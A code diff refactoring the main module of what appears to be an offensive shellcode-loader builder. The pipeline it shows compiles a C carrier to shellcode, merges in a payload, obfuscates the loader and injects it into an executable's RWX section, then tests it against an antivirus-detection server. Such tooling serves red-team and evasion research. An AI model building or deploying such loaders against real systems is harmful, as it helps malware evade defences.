@@ -18,7 +18,6 @@ from model.project import Project
 from model.settings import Settings
 from model.defs import *
 from log import setup_logging
-from utils import delete_all_files_in_directory
 
 
 def main():
@@ -104,25 +103,29 @@ def main():
 def start(settings: Settings) -> int:
     """Main entry point for the application. Will handle log files and cleanup"""
 
+    settings.prep()
+
     # Delete: all old files
     if settings.cleanup_files_on_start:
-        clean_files()
-        delete_all_files_in_directory(f"{logs_dir}/")
+        clean_files(settings)
+        
     # And logs
     observer.reset()
 
+    # Do the thing and catch errors
     try:
         start_real(settings)
     except Exception as e:
         logger.error(f'Error compiling: {e}')
-        write_logs()
+        write_logs(settings.main_dir)
         return 1
     
     # Cleanup files
     if settings.cleanup_files_on_exit:
-        clean_files()
+        clean_files(settings)
 
-    write_logs()
+    # Write logs (on success)
+    write_logs(settings.main_dir)
     return 0
 
 
@@ -142,19 +145,13 @@ def start_real(settings: Settings):
     ))
 
     # Create: Carrier C source files from template (C->C)
-    phases.templater.create_c_from_template(
-        source_style = settings.source_style,
-        alloc_style  = settings.alloc_style,
-        exec_style   = settings.exec_style,
-        decoder_style= settings.decoder_style,
-        payload_len  = project.payload.len,
-    )
+    phases.templater.create_c_from_template(settings, project.payload.len)
 
     # Compile: Carrier to .asm (C -> ASM)
     if settings.generate_asm_from_c:
         phases.compiler.compile(
-            c_in = main_c_file, 
-            asm_out = main_asm_file, 
+            c_in = settings.main_c_path, 
+            asm_out = settings.main_asm_path, 
             payload_len = project.payload.len,
             carrier = project.carrier,
             source_style = project.settings.source_style,
@@ -164,15 +161,15 @@ def start_real(settings: Settings):
     # Assemble: Assemble .asm to .shc (ASM -> SHC)
     if settings.generate_shc_from_asm:
         phases.assembler.asm_to_shellcode(
-            asm_in = main_asm_file, 
-            build_exe = main_exe_file, 
-            shellcode_out = main_shc_file)
+            asm_in = settings.main_asm_path, 
+            build_exe = settings.main_exe_path, 
+            shellcode_out = settings.main_shc_path)
     
     # Merge: shellcode/loader with payload (SHC + PAYLOAD -> SHC)
     if settings.dataref_style == DataRefStyle.APPEND:
         phases.assembler.merge_loader_payload(
-            shellcode_in = main_shc_file,
-            shellcode_out = main_shc_file,
+            shellcode_in = settings.main_shc_path,
+            shellcode_out = settings.main_shc_path,
             payload_data = project.payload.payload_data, 
             decoder_style = settings.decoder_style)
 
@@ -181,12 +178,12 @@ def start_real(settings: Settings):
         logger.info("--[ RWX section {} found. Will obfuscate loader+payload and inject into it".format(
             project.exe_host.rwx_section.Name.decode().rstrip('\x00')
         ))
-        obfuscate_shc_loader(main_shc_file, main_shc_file + ".sgn")
-        observer.add_code_file("payload_sgn", file_readall_binary(main_shc_file + ".sgn"))
-        shutil.move(main_shc_file + ".sgn", main_shc_file)
+        obfuscate_shc_loader(settings.main_shc_path, settings.main_shc_path + ".sgn")
+        observer.add_code_file("payload_sgn", file_readall_binary(settings.main_shc_path + ".sgn"))
+        shutil.move(settings.main_shc_path + ".sgn", settings.main_shc_path)
 
     # inject merged loader into an exe
-    phases.injector.inject_exe(main_shc_file, settings, project)
+    phases.injector.inject_exe(settings.main_shc_path, settings, project)
     observer.add_code_file("exe_final", extract_code_from_exe_file_ep(settings.inject_exe_out, 300))
 
     if config.get("avred_server") != "":
@@ -210,21 +207,21 @@ def start_real(settings: Settings):
             ], check=True)
 
 
-def write_logs():
+def write_logs(working_dir: str):
     # Our log output
-    with open(f"{logs_dir}/supermega.log", "w") as f:
+    with open(f"{working_dir}log-supermega.log", "w") as f:
         for line in observer.get_logs():
             f.write(line + "\n")
 
     # Stdout of executed commands
-    with open(f"{logs_dir}/cmdoutput.log", "w") as f:
+    with open(f"{working_dir}log-cmdoutput.log", "w") as f:
         for line in observer.get_cmd_output():
             f.write(line)
 
     # Write all files
     idx = 0
     for name, data in observer.files:
-        with open(f"{logs_dir}/{idx}-{name}", "w") as f:
+        with open(f"{working_dir}log-{idx}-{name}", "w") as f:
             f.write(data)
         idx += 1
 
